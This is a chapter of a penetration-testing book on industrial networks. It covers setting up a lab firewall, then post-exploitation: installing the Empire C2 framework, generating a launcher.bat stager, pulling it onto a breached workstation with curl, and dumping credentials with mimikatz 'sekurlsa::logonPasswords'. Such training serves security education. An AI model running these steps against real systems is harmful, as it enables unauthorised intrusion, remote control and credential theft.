<html><head></head><body>
		<div id="_idContainer508">
			<h1 id="_idParaDest-115"><em class="italic"><a id="_idTextAnchor130"/>Chapter <a id="_idTextAnchor131"/>11</em>: Whoot… I Have To Go Deep</h1>
			<p>After reading the previous chapter, we have a foothold/shell, but now what? Next, we need to understand where we have landed and what we have access to. This includes gathering as much information as possible, harvesting credentials, mapping network connections, using proxies to run internal network scans, and discovering pivotable hosts. This is the phase where we need to traverse the inside of the system. We can accomplish this by using tools to map the network through proxies and go deeper. Depending on the entry point, there will be key information to discover, including clues, which will provide details about lower-level systems that will be required to get down to the physical I/O.</p>
			<p>In this chapter, we will be installing a firewall that will allow us to build out segmentation in our lab network. After gaining initial access to a network, this tends to be where people get stuck and typically ask questions such as, what do I do now? How do I gain administrative access? Where do I go next? This chapter will help address these questions. We will leverage Empire to build a <strong class="bold">Control and Command</strong> (<strong class="bold">C2</strong>) server, which will allow us to harness credentials, find exploitable services, and gain elevated privileges. Next, we will work with port forwarding, SSH tunneling, and proxychains to get us further into the network and ultimately compromise the industrial process. </p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>Configuring a firewall</li>
				<li>I have a shell, now what?</li>
				<li>Escalating privileges</li>
				<li>Pivoting</li>
			</ul>
			<h1 id="_idParaDest-116"><a id="_idTextAnchor132"/>Technical requirements</h1>
			<p>For this chapter, you will need the following:</p>
			<ul>
				<li>A pfSense firewall, which you can download from <a href="https://www.pfsense.org/download/">https://www.pfsense.org/download/</a>.</li>
				<li>A Kali Linux VM running with the following tools installed:<p>- <strong class="bold">Empire</strong>: <a href="https://github.com/BC-SECURITY/Empire/releases/tag/v3.8.2">https://github.com/BC-SECURITY/Empire/releases/tag/v3.8.2</a> </p><p>- <strong class="bold">mimikatz</strong>: <a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a> </p><p>- <strong class="bold">Proxychains</strong>: This can be installed by running <strong class="source-inline">sudo apt install proxychains</strong></p><p>- <strong class="bold">chisel</strong>: <a href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a> </p><p>- <strong class="bold">Freerdp2</strong>: This can be installed by running <strong class="source-inline">sudo apt install freerdp2-x11 freerdp2-shadow-x11</strong></p></li>
			</ul>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3lAzYVb">https://bit.ly/3lAzYVb</a></p>
			<h1 id="_idParaDest-117"><a id="_idTextAnchor133"/>Configuring a firewall</h1>
			<p>You are probably wondering why, in every chapter, we are installing or configuring something new in the lab. You might be wondering, <em class="italic">why didn't we install this earlier in this book?</em> This isn't a wrong train of thought as we could have simply spent the first part of this book installing <a id="_idIndexMarker755"/>everything that we needed for the lab. However, I feel that it is very important to get into the practice of continually building and tearing down your lab. This helps promote adaptability, which is a key component of pentesting. Adding elements in every chapter helps reinforce the practice of adaptability.</p>
			<p>Many vendors provide industrial firewalls, with some of the more industry-recognized names being Cisco, Fortinet, Checkpoint, Palo Alto, Belden, and Moxa. Each vendor comes with a list of pros and cons, techniques, and features, which I will leave up to you to investigate further. When it comes to implementing firewalls and encountering them during an engagement, you have to be highly adaptive. I have seen networks with zero firewalls installed and then on the flip side, I have seen networks with micro-segmentation and multi-tiered separation of duties, which means that many hands are required to try and build a connection across a corporate network. By introducing a firewall to our lab, we will be implementing controlled segmentation for our network. In this section, we will be installing and configuring the latest version of the pfSense (Community Edition) firewall. Let's get started:</p>
			<ol>
				<li>Navigate to the following link to download the latest version of pfSense. At the time of writing, this is version 2.5.1: <a href="https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.1-RELEASE-amd64.iso.gz">https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.1-RELEASE-amd64.iso.gz</a>.<p>Once you have the ISO, make sure that you load it into your datastore and start up a new VM. I used the options shown in the following screenshot for the configuration. The most important aspect is the network adapters. We will be placing the firewall <a id="_idIndexMarker756"/>at Level 4 so that it connects <strong class="bold">Level 5: Enterprise</strong> to <strong class="bold">Level 3: Operations</strong>, as shown in the following screenshot:</p><div id="_idContainer445" class="IMG---Figure"><img src="image/B16321_11_001.jpg" alt="Figure 11.1 – Firewall configuration&#13;&#10;"/></div><p class="figure-caption">Figure 11.1 – Firewall configuration</p></li>
				<li>Once configured, start up the VM and wait while it performs the initial boot. You will be <a id="_idIndexMarker757"/>greeted by the <strong class="bold">End User License Agreement</strong> (<strong class="bold">EULA</strong>). Go ahead and click <strong class="bold">&lt;Accept&gt;</strong>, as shown in the following screenshot:<div id="_idContainer446" class="IMG---Figure"><img src="image/B16321_11_002.jpg" alt="Figure 11.2 – EULA&#13;&#10;"/></div><p class="figure-caption">Figure 11.2 – EULA</p></li>
				<li>After accepting <a id="_idIndexMarker758"/>the agreement, you will be presented with three options. Select <strong class="bold">Install</strong> and start installing pfSense, as shown in the following screenshot:<div id="_idContainer447" class="IMG---Figure"><img src="image/B16321_11_003.jpg" alt="Figure 11.3 – Install pfSense option&#13;&#10;"/></div><p class="figure-caption">Figure 11.3 – Install pfSense option</p></li>
				<li>Next, you have the option to change the keymap language, depending on your location. Pick any language you wish. I will be using the standard <strong class="bold">"US"</strong> default option, as shown here:<div id="_idContainer448" class="IMG---Figure"><img src="image/B16321_11_004.jpg" alt="Figure 11.4 – Keymap&#13;&#10;"/></div><p class="figure-caption">Figure 11.4 – Keymap</p></li>
				<li>After keymapping, we can <a id="_idIndexMarker759"/>choose how we would like to partition the disk. I am going to use the <strong class="bold">Auto (UFS) BIOS</strong> method, as shown in the following screenshot:<div id="_idContainer449" class="IMG---Figure"><img src="image/B16321_11_005.jpg" alt="Figure 11.5 – Disk partitioning&#13;&#10;"/></div><p class="figure-caption">Figure 11.5 – Disk partitioning</p></li>
				<li>Once the installer finishes running, you have the option to enter the terminal and add some tweaks to the firewall before rebooting. I selected <strong class="bold">No</strong> to keep everything at its defaults:<div id="_idContainer450" class="IMG---Figure"><img src="image/B16321_11_006.jpg" alt="Figure 11.6 – Final tweaks&#13;&#10;"/></div><p class="figure-caption">Figure 11.6 – Final tweaks</p></li>
				<li>Now, you can reboot your system or enter the shell directly. I chose to reboot the system as a <a id="_idIndexMarker760"/>habit so that lingering changes aren't fully committed until a reboot occurs. Select <strong class="bold">Reboot</strong> to continue, as shown in the following screenshot:<div id="_idContainer451" class="IMG---Figure"><img src="image/B16321_11_007.jpg" alt="Figure 11.7 – Reboot&#13;&#10;"/></div><p class="figure-caption">Figure 11.7 – Reboot</p></li>
				<li>Once the reboot completes, you will be presented with a list of options on the console. You should also see a DHCP <strong class="source-inline">wan</strong> that's been provided by your LABCORP DNS server, as well as a default <strong class="source-inline">lan</strong> address, as shown in the following screenshot:<div id="_idContainer452" class="IMG---Figure"><img src="image/B16321_11_008.jpg" alt="Figure 11.8 – Console menu&#13;&#10;"/></div><p class="figure-caption">Figure 11.8 – Console menu</p></li>
				<li>We are going to use the default <strong class="source-inline">lan</strong> IP address and open a browser to configure the firewall via <a id="_idIndexMarker761"/>the web UI. Navigate to the IP address that's been assigned to your LAN. In my case, it is <strong class="source-inline">192.168.3.1</strong>. Use <strong class="source-inline">admin</strong> as your username and <strong class="source-inline">pfsense</strong> as your password to log into the firewall:<div id="_idContainer453" class="IMG---Figure"><img src="image/B16321_11_009.jpg" alt="Figure 11.9 – pfSense login&#13;&#10;"/></div><p class="figure-caption">Figure 11.9 – pfSense login</p><p>Once logged in, you will see the <strong class="bold">pfSense Setup</strong> wizard, as shown in the following screenshot:</p><div id="_idContainer454" class="IMG---Figure"><img src="image/B16321_11_010.jpg" alt="Figure 11.10 – Setup wizard&#13;&#10;"/></div><p class="figure-caption">Figure 11.10 – Setup wizard</p></li>
				<li>Next, we must <a id="_idIndexMarker762"/>set up the <strong class="bold">General Information</strong> options for <strong class="bold">Hostname</strong>, <strong class="bold">Domain</strong>, and <strong class="bold">Primary DNS Server</strong>:<div id="_idContainer455" class="IMG---Figure"><img src="image/B16321_11_011.jpg" alt="Figure 11.11 – General Information&#13;&#10;"/></div><p class="figure-caption">Figure 11.11 – General Information</p></li>
				<li>The next important option to configure will be the WAN interface. Set this to <strong class="bold">DHCP</strong>, as shown in the following screenshot:<div id="_idContainer456" class="IMG---Figure"><img src="image/B16321_11_012.jpg" alt="Figure 11.12 – Configure WAN Interface&#13;&#10;"/></div><p class="figure-caption">Figure 11.12 – Configure WAN Interface</p></li>
				<li>We also want to make sure that we don't block any RF1918 networks as we are going to be using this firewall internally, as shown here:<div id="_idContainer457" class="IMG---Figure"><img src="image/B16321_11_013.jpg" alt="Figure 11.13 – RFC1918 Networks&#13;&#10;"/></div><p class="figure-caption">Figure 11.13 – RFC1918 Networks</p></li>
				<li>Next, we want to set the LAN interface. For the subnet that we statically configured <a id="_idIndexMarker763"/>earlier in this book, we will be setting the address as <strong class="source-inline">192.168.3.1</strong>, as shown in the following screenshot:<div id="_idContainer458" class="IMG---Figure"><img src="image/B16321_11_014.jpg" alt="Figure 11.14 – LAN interface&#13;&#10;"/></div><p class="figure-caption">Figure 11.14 – LAN interface</p></li>
				<li>You will have the option to change the default password for the admin interface, so go ahead and change it. Next, you will be asked to reload the configuration, which will take a minute or so. Once it has reloaded you will have to point your browser to <strong class="source-inline">192.168.3.1</strong> to get back to the web interface. Once you log back in to the web interface, you will see the dashboard, where you will see <strong class="bold">System Information</strong>, the <strong class="bold">Interfaces</strong> configuration, and <strong class="bold">Netgate Services and Support</strong>, as shown in the following screenshot:<div id="_idContainer459" class="IMG---Figure"><img src="image/B16321_11_015.jpg" alt="Figure 11.15 – pfSense dashboard&#13;&#10;"/></div><p class="figure-caption">Figure 11.15 – pfSense dashboard</p></li>
				<li>We want to <a id="_idIndexMarker764"/>set up a DHCP server for our LAN interface. Navigate to <strong class="bold">Services</strong> | <strong class="bold">DHCP Server</strong>, as shown in the following screenshot:<div id="_idContainer460" class="IMG---Figure"><img src="image/B16321_11_016.jpg" alt="Figure 11.16 – DHCP server&#13;&#10;"/></div><p class="figure-caption">Figure 11.16 – DHCP server</p></li>
				<li>From here, we are going to set the <strong class="bold">General Options</strong> options by setting the following:<p>– <strong class="bold">Subnet</strong>: <strong class="source-inline">192.168.3.0</strong></p><p>– <strong class="bold">Subnet mask</strong>: <strong class="source-inline">255.255.255.0</strong></p><p>– <strong class="bold">Available range</strong>: <strong class="source-inline">192.168.3.1 – 192.168.3.254</strong></p><p>– <strong class="bold">Range</strong>: <strong class="bold">From</strong> <strong class="source-inline">[192.168.3.100]</strong> – <strong class="bold">To</strong> <strong class="source-inline">[192.168.3.199]</strong></p><p>Here is an <a id="_idIndexMarker765"/>example for you to follow:</p><div id="_idContainer461" class="IMG---Figure"><img src="image/B16321_11_017.jpg" alt="Figure 11.17 – DHCP server&#13;&#10;"/></div><p class="figure-caption">Figure 11.17 – DHCP server</p></li>
				<li>From here, we are going to add a <em class="italic">misconfigured</em> NAT rule to allow traffic from the enterprise to communicate with operations and vice versa:<div id="_idContainer462" class="IMG---Figure"><img src="image/B16321_11_018.jpg" alt="Figure 11.18 – NAT selection&#13;&#10;"/></div><p class="figure-caption">Figure 11.18 – NAT selection</p></li>
				<li>Now, we want <a id="_idIndexMarker766"/>to select <strong class="bold">Port Forward</strong> and add a new rule. You should see an empty list:<div id="_idContainer463" class="IMG---Figure"><img src="image/B16321_11_019.jpg" alt="Figure 11.19 – Port Forward&#13;&#10;"/></div><p class="figure-caption">Figure 11.19 – Port Forward</p></li>
				<li>Upon clicking the <strong class="bold">Add</strong> green button, you will be brought to the <strong class="bold">Edit Redirect Entry</strong> screen. We are going to leave most of the options as-is, but we must make some changes to the source and destination options.<p>The following are the options that we will want to configure:</p><p>– <strong class="bold">Source</strong>: <strong class="bold">Type</strong> (<strong class="bold">Network</strong>) | <strong class="bold">Address</strong> (<strong class="source-inline">172.16.0.0</strong>) | <strong class="bold">Mask</strong> (<strong class="bold">24</strong>)</p><p>– <strong class="bold">Destination</strong>: <strong class="bold">Type</strong> (<strong class="bold">WAN address</strong>)</p><p>– <strong class="bold">Destination port range</strong>: <strong class="bold">From port</strong> (<strong class="bold">Any</strong>) | <strong class="bold">To port</strong> (<strong class="bold">Any</strong>)</p><p>– <strong class="bold">Redirect target IP</strong>: <strong class="bold">Type</strong> (<strong class="bold">Single host</strong>) | <strong class="bold">Address</strong> (<strong class="source-inline">192.168.3.10</strong>)</p><p>See the following screenshot for some guidance:</p><div id="_idContainer464" class="IMG---Figure"><img src="image/B16321_11_020.jpg" alt="Figure 11.20 – Port forward/edit&#13;&#10;"/></div><p class="figure-caption">Figure 11.20 – Port forward/edit</p></li>
				<li>Once configured <a id="_idIndexMarker767"/>and after providing a <strong class="bold">Description</strong>, make sure to click the <strong class="bold">Save</strong> button at the bottom of the screen. Once saved, you will see a popup that allows you to <strong class="bold">Apply Changes</strong> to the firewall. Go ahead and apply your changes, as shown here:<div id="_idContainer465" class="IMG---Figure"><img src="image/B16321_11_021.jpg" alt="Figure 11.21 – The Apply Changes button&#13;&#10;"/></div><p class="figure-caption">Figure 11.21 – The Apply Changes button</p><p>Now, you should see the following <strong class="bold">Port Forward</strong> rule:</p><div id="_idContainer466" class="IMG---Figure"><img src="image/B16321_11_022.jpg" alt="Figure 11.22 – The Port Forward rule&#13;&#10;"/></div><p class="figure-caption">Figure 11.22 – The Port Forward rule</p></li>
				<li>We want to validate that <strong class="bold">Outbound NAT Mode</strong> has been set to <strong class="bold">Automatic outbound NAT rule generation</strong>, as shown here:<div id="_idContainer467" class="IMG---Figure"><img src="image/B16321_11_023.jpg" alt="Figure 11.23 – Outbound NAT Mode&#13;&#10;"/></div><p class="figure-caption">Figure 11.23 – Outbound NAT Mode</p></li>
				<li>Finally, we want <a id="_idIndexMarker768"/>to verify that our WAN rules were created by going to <strong class="bold">Firewall</strong> | <strong class="bold">WAN</strong>. You should have a rule that looks like this:<div id="_idContainer468" class="IMG---Figure"><img src="image/B16321_11_024.jpg" alt="Figure 11.24 – WAN rule&#13;&#10;"/></div><p class="figure-caption">Figure 11.24 – WAN rule</p><p>Now that our firewall has been configured, we want to quickly add the Windows 7 machine that we used earlier in this book to configure the PLC to the <strong class="source-inline">labcorp.local</strong> domain. Let's get started:</p></li>
				<li>To do this, we must edit our network interface and update the <strong class="bold">Preferred DNS server</strong> option, as shown here:<div id="_idContainer469" class="IMG---Figure"><img src="image/B16321_11_025.jpg" alt="Figure 11.25 – Preferred DNS server&#13;&#10;"/></div><p class="figure-caption">Figure 11.25 – Preferred DNS server</p></li>
				<li>Next, navigate <a id="_idIndexMarker769"/>to <strong class="bold">Computer</strong> | <strong class="bold">Properties</strong> | <strong class="bold">System Properties</strong> | <strong class="bold">Computer name</strong>. From here, set <strong class="bold">Computer name</strong> to <strong class="source-inline">OS1</strong> for operator station 1. Then, select <strong class="bold">Domain</strong> and set it to <strong class="source-inline">labcorp.local</strong>, as shown in the following screenshot:<div id="_idContainer470" class="IMG---Figure"><img src="image/B16321_11_026.jpg" alt="Figure 11.26 – Computer Name/Domain Changes&#13;&#10;"/></div><p class="figure-caption">Figure 11.26 – Computer Name/Domain Changes</p></li>
				<li>Now, let's make <a id="_idIndexMarker770"/>sure that we are domain-connected and can authenticate with a known user. As shown in the following screenshot, we have used <strong class="source-inline">operator1</strong> to log into the Windows 7 VM:<div id="_idContainer471" class="IMG---Figure"><img src="image/B16321_11_027.jpg" alt="Figure 11.27 – Domain-connected&#13;&#10;"/></div><p class="figure-caption">Figure 11.27 – Domain-connected</p></li>
				<li>We need to make sure that our lab operators can use <strong class="bold">Remote Desktop</strong> by adding <strong class="source-inline">LABCORP\Domain Users</strong> to <strong class="bold">Remote Desktop Users</strong>, as shown here:</li>
			</ol>
			<div>
				<div id="_idContainer472" class="IMG---Figure">
					<img src="image/B16321_11_028.jpg" alt="Figure 11.28 – Domain users as Remote Desktop Users&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.28 – Domain users as Remote Desktop Users</p>
			<p>In this section, we configured a firewall to introduce segmentation between the enterprise network <a id="_idIndexMarker771"/>and the operations network. We also quickly connected the Windows 7 VM that we installed in <a href="B16321_01_Epub_AM.xhtml#_idTextAnchor013"><em class="italic">Chapter 1</em></a>, <em class="italic">Using Virtualization</em>, to the domain that we created in <a href="B16321_10_Epub_AM.xhtml#_idTextAnchor112"><em class="italic">Chapter 10</em></a>, <em class="italic">I Can Do It 420</em>, and made sure that the <strong class="source-inline">LABCORP</strong> users have remote desktop access to their operator workstation. In the next section, we will learn how to leverage these configurations to discover paths through the network.</p>
			<h1 id="_idParaDest-118"><a id="_idTextAnchor134"/>I have a shell, now what?</h1>
			<p>It's time to go back to our scheduled broadcast. Once we have gained access, watching that shell as it pops up in front of our eyes is exhilarating. However, the hard work has yet to come. Next, we need to understand where we have landed and what we have access to. For this, we are <a id="_idIndexMarker772"/>going to explore a post-exploitation framework called <strong class="bold">Empire</strong>. Empire is a C2 framework that's used to install PowerShell agents that can deliver modules on demand. These modules contain a lot of packages that I have come to use over the years, so it is very nice to have them centralized. Empire provides modules such as winPEAS, Sherlock, Watson, PowerUp, mimikatz, and more. These tools help automate data collection on the system and environment that we have landed in and helps us establish a beachhead for our pentesting adventures.</p>
			<p>In this section, we are going to quickly install Empire, create a listener, build a stager, and then deliver modules to our host. Let's get started:</p>
			<ol>
				<li value="1">First, we want to clone this GitHub repository and run the <strong class="source-inline">install</strong> script:<p class="source-code"><strong class="bold">git clone --recursive https://github.com/BC-SECURITY/Empire.git</strong></p><p class="source-code"><strong class="bold">cd Empire</strong></p><p class="source-code"><strong class="bold">sudo ./setup/install.sh</strong></p></li>
				<li>Once the installation has finished, we must run the<strong class="source-inline">./empire</strong> command. Once you've done this, you will <a id="_idIndexMarker773"/>see a splash page section that shows the total number of modules, the number of listeners, and the number of agents currently active in the version of the tool that you've installed. In my case, as shown in the following screenshot, I have <strong class="source-inline">319</strong> modules available for post-exploitation, and <strong class="source-inline">0</strong> listeners and <strong class="source-inline">0</strong> agents running as this is the first time I have run Empire before the engagement:<div id="_idContainer473" class="IMG---Figure"><img src="image/B16321_11_029.jpg" alt="Figure 11.29 – Empire&#13;&#10;"/></div><p class="figure-caption">Figure 11.29 – Empire</p></li>
				<li>Next, we want to set up a listener for our soon-to-be deployed agents to report back to. In this case, at the <strong class="source-inline">(Empire</strong>) <strong class="source-inline">&gt;</strong> prompt, we can run the <strong class="source-inline">uselistener</strong> command, and then add a space and press <em class="italic">Tab</em> to see the available options that we can use. I am going to select <strong class="source-inline">http</strong> in this case for my listener. After that, you can type <strong class="source-inline">info</strong> to bring up a list of commands, as shown in the following screenshot:<div id="_idContainer474" class="IMG---Figure"><img src="image/B16321_11_030.jpg" alt="Figure 11.30 – uselistener http&#13;&#10;"/></div><p class="figure-caption">Figure 11.30 – uselistener http</p><p>Here, you can fine-tune your listener. In my case, I only changed the <strong class="bold">Name</strong> and <strong class="bold">Host</strong> options. I set <strong class="bold">Host</strong> to my Kali Linux IP address, which is <strong class="source-inline">172.16.0.6</strong></p></li>
				<li>Next, we want to <a id="_idIndexMarker774"/>create a stager that can be installed on our <em class="italic">victim</em> machine. We are going to use the <strong class="source-inline">(Empire) &gt; usestager multi/launcher http</strong> command for this. This command sets the stager to multi/launcher and attaches it to the listener that we created in the previous step. When you type <strong class="source-inline">info</strong>, you will be presented with options that you can change and tune for your agent delivery mechanism. <p>Here, if you simply type <strong class="source-inline">generate</strong>, the default option will be to print to the screen. This allows you to copy and paste the shellcode into your victim's system. Or, if you are lazy like I am, you can set the <strong class="source-inline">OutFile</strong> option to have Empire generate a <strong class="source-inline">.bat</strong> file that you can pass into your victim. Here is the output from running <strong class="source-inline">generate</strong> without setting the file:</p><div id="_idContainer475" class="IMG---Figure"><img src="image/B16321_11_031.jpg" alt="Figure 11.31 – Stager shellcode&#13;&#10;"/></div><p class="figure-caption">Figure 11.31 – Stager shellcode</p></li>
				<li>Now, if you want <a id="_idIndexMarker775"/>to set the file option so that you can simply copy it to various systems that we wish to compromise, use the <strong class="source-inline">set OutFile launcher.bat</strong> command, type <strong class="source-inline">info</strong>, and press <em class="italic">Enter</em>. You will see that the <strong class="source-inline">OutFile</strong> option now has <strong class="source-inline">launcher.bat</strong> as a <strong class="source-inline">Value</strong> field, as shown here:<div id="_idContainer476" class="IMG---Figure"><img src="image/B16321_11_032.jpg" alt="Figure 11.32 – OutFile setting&#13;&#10;"/></div><p class="figure-caption">Figure 11.32 – OutFile setting</p><p>After setting your file type to <strong class="source-inline">generate</strong> and pressing <em class="italic">Enter</em>, if everything is correct, you should get the following output:</p><div id="_idContainer477" class="IMG---Figure"><img src="image/B16321_11_033.jpg" alt="Figure 11.33 – generate &#13;&#10;"/></div><p class="figure-caption">Figure 11.33 – generate </p></li>
				<li>Now, we are going to upload our newly created <strong class="source-inline">launcher.bat</strong> file to the workstation machine that we previously breached and run the file. I will leave it up to you to get <a id="_idIndexMarker776"/>into the workstation – I used Evil-WinRM to create a session with the <strong class="source-inline">operator2</strong> credentials we discovered and then created a <strong class="source-inline">python3 -m http.server</strong> to host my <strong class="source-inline">launcher.bat</strong> file. Finally, I used <strong class="source-inline">curl</strong> to grab the file and pull it into the workstation, as shown here:<div id="_idContainer478" class="IMG---Figure"><img src="image/B16321_11_034.jpg" alt="Figure 11.34 – launcher.bat on the workstation&#13;&#10;"/></div><p class="figure-caption">Figure 11.34 – launcher.bat on the workstation</p></li>
				<li>Once you've run the file, go back to your <strong class="source-inline">(Empire) &gt;</strong> interface and type the <strong class="source-inline">agents</strong> command. This will bring up a list of active agents that are available to you, as shown in the following screenshot:<div id="_idContainer479" class="IMG---Figure"><img src="image/B16321_11_035.jpg" alt="Figure 11.35 – Active agents&#13;&#10;"/></div><p class="figure-caption">Figure 11.35 – Active agents</p></li>
				<li>At this point, we have a live agent that is beaconing back to our Empire C2 platform – this is awesome! The next step is to type <strong class="source-inline">interact &lt;agent name&gt;</strong>. In my case, it will be <strong class="source-inline">interact 62FRNKHT</strong>. After connecting, type <strong class="source-inline">info</strong> to see what options can be configured. The following is the output I received:<div id="_idContainer480" class="IMG---Figure"><img src="image/B16321_11_036.jpg" alt="Figure 11.36 – Interacting with the agent&#13;&#10;"/></div><p class="figure-caption">Figure 11.36 – Interacting with the agent</p></li>
				<li>Excellent! At this point, we are interacting with our agent. Let's start taking a look at our system <a id="_idIndexMarker777"/>and its surroundings. Typing the <strong class="source-inline">usemodule</strong> command and pressing <em class="italic">Tab</em> will bring up a long list of modules that we have access to. There are 12 primary categories, and they contain various submodules. Here are the categories:<p>- <strong class="source-inline">code_execution</strong></p><p>- <strong class="source-inline">collection</strong></p><p>- <strong class="source-inline">credentials</strong></p><p>- <strong class="source-inline">exfiltration</strong></p><p>- <strong class="source-inline">exploitation</strong></p><p>- <strong class="source-inline">lateral_movement</strong></p><p>- <strong class="source-inline">management</strong></p><p>- <strong class="source-inline">persistence</strong></p><p>- <strong class="source-inline">privesc</strong></p><p>- <strong class="source-inline">recon</strong></p><p>- <strong class="source-inline">situational_awareness</strong></p><p>- <strong class="source-inline">trollsploit</strong></p><p>Take a look at the <a id="_idIndexMarker778"/>various categories and what submodules they have to offer. As we mentioned earlier, we want to gather some situational awareness. For this, we will use the <strong class="source-inline">situational_awareness</strong> category. From here, select <strong class="source-inline">host</strong> and the <strong class="source-inline">Seatbelt</strong> module. To find out more about Seatbelt and its extensive capabilities, take a look at the following link: <a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a>. </p></li>
				<li>Use the <strong class="source-inline">usemodule situational_awareness/host/seatbelt</strong> command once you have set your module type to <strong class="source-inline">info</strong> to take a look at the available options. Then, <strong class="source-inline">run</strong> the module – you should get the following output:</li>
			</ol>
			<div>
				<div id="_idContainer481" class="IMG---Figure">
					<img src="image/B16321_11_037.jpg" alt="Figure 11.37 – The Seatbelt module&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.37 – The Seatbelt module</p>
			<p>Empire assigns a task ID to the running module, which allows sequencing to occur at the agent level. Once the module runs, you will see feedback from the agent, and it will be displayed on the screen. As Seatbelt runs, various tests will be performed on the workstation and a mass amount of information will be harvested, which can easily fill up the visual buffer. You can find an <strong class="source-inline">agent.log</strong> that contains the output of tests that have been run by the agent under <strong class="source-inline">Empire/downloads/&lt;agent name&gt;/agent.log</strong>. Upon reviewing this log file, you can find interesting information about the host system that the agent resides on. You will discover various interfaces being utilized, antivirus software, AppLocker, autorun programs, environment variables, interesting files, interesting processes, and much more. The following screenshot shows a list of users with administrative privileges on workstation 1, which was discovered through one of the tests:</p>
			<div>
				<div id="_idContainer482" class="IMG---Figure">
					<img src="image/B16321_11_038.jpg" alt="Figure 11.38 – Admin privileges&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.38 – Admin privileges</p>
			<p>Another test is discovering <a id="_idIndexMarker779"/>current RDP sessions that are present on the host, which we can do by reading through the log file with the username set to <strong class="source-inline">lab.da</strong>, as shown here:</p>
			<div>
				<div id="_idContainer483" class="IMG---Figure">
					<img src="image/B16321_11_039.jpg" alt="Figure 11.39 – RDP sessions&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.39 – RDP sessions</p>
			<p>These are simply snippets of the information that has been gleaned from the tests that Seatbelt performs. However, as you search through the log file, you will find that <strong class="source-inline">Operator2</strong> does not have administrative access, and this proves to be an issue when gleaning more detailed information. This moves us nicely to the next section, where we will discover how to elevate our privileges to gain deeper insights into our victim machine.</p>
			<h1 id="_idParaDest-119"><a id="_idTextAnchor135"/>Escalating privileges</h1>
			<p>Privilege escalation is <a id="_idIndexMarker780"/>where an attacker looks to gain access that extends beyond the scope of the exploited user's ability. There are two forms: <strong class="bold">horizontal</strong> privilege escalation and <strong class="bold">vertical</strong> privilege escalation. Horizontal privilege escalation is a term that's used for maintaining a current user's privileges while leveraging <a id="_idIndexMarker781"/>flaws in system policies, software, and file settings, which allows the current user to access other user resources, files, and services. This type of privilege access is commonplace in industrial control <a id="_idIndexMarker782"/>systems and in my experience, it can be enough to bring systems and processes to a grinding halt. Vertical privilege <a id="_idIndexMarker783"/>escalation, on the other hand, is the attacker's journey, whereby they move from a less privileged account through to a system admin <a id="_idIndexMarker784"/>or a domain admin account. Once an attacker has a domain admin account, they can wreak havoc inside of the compromised network and infrastructure. </p>
			<p>In the previous <a id="_idIndexMarker785"/>section, we installed Empire, which allowed us to run post-exploitation recon and situational awareness. We are going to leverage the same C2 engine to run the <strong class="source-inline">privesc</strong> modules. For this, we are going to install our <strong class="source-inline">launcher.bat</strong> file; that is, <strong class="source-inline">operator1</strong>: </p>
			<ol>
				<li value="1">As you may recall from <a href="B16321_10_Epub_AM.xhtml#_idTextAnchor112"><em class="italic">Chapter 10</em></a>, <em class="italic">I Can Do It 420</em>, we discovered the NTLM hash of <strong class="source-inline">operator1</strong> NTLM hash and we used hashcat to crack it. Once you run <strong class="source-inline">launcher.bat</strong> under <strong class="source-inline">operator1</strong>, go back to Empire and look at its list agents. You should now see that two agents have been installed, as shown here:<div id="_idContainer484" class="IMG---Figure"><img src="image/B16321_11_040.jpg" alt="Figure 11.40 – Installing the operator1 agent &#13;&#10;"/></div><p class="figure-caption">Figure 11.40 – Installing the operator1 agent </p></li>
				<li>Next, we will interact with our new agent by using the <strong class="source-inline">interact &lt;agent name&gt;</strong> command. In my case, the command will be <strong class="source-inline">interact 1PKZ7G3T</strong>. As we saw in the previous section, there are many modules that we can use to perform various tests and attacks. To start, we can use the <strong class="source-inline">credentials/mimikatz/command</strong> module, which allows us to change the command and <a id="_idIndexMarker786"/>continue running <strong class="bold">mimikatz</strong>. Mimikatz is a legendary tool that's used to dump system credentials. To learn more about it, go to <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>. We will be using mimikatz to dump <a id="_idIndexMarker787"/>credentials and tickets. Then, using these tickets, we will run a <strong class="bold">pass-the-ticket</strong> (<strong class="bold">PTT</strong>) attack. A PTT attack works by dumping <a id="_idIndexMarker788"/>Kerberos tickets from the <strong class="bold">Local Security Authority Subsystem Service</strong> (<strong class="bold">LSASS</strong>) memory.</li>
				<li>Use the <strong class="source-inline">set Command sekurlsa::logonPasswords</strong> command and then type <strong class="source-inline">run</strong>. You should <a id="_idIndexMarker789"/>see the following output:<div id="_idContainer485" class="IMG---Figure"><img src="image/B16321_11_041.jpg" alt="Figure 11.41 – sekurlsa logonPasswords&#13;&#10;"/></div><p class="figure-caption">Figure 11.41 – sekurlsa logonPasswords</p></li>
				<li>Once the module has finished running, type <strong class="source-inline">creds</strong> and press <em class="italic">Enter</em>. You will see the credentials that have been captured; these will be stored automatically by Empire. Using the <strong class="source-inline">creds</strong> storage side of Empire is a key feature that will help immensely with your pentesting engagement. You can view the credentials that were discovered by running the <strong class="source-inline">logonPasswords</strong> command:<div id="_idContainer486" class="IMG---Figure"><img src="image/B16321_11_042.jpg" alt="Figure 11.42 – Credentials&#13;&#10;"/></div><p class="figure-caption">Figure 11.42 – Credentials</p></li>
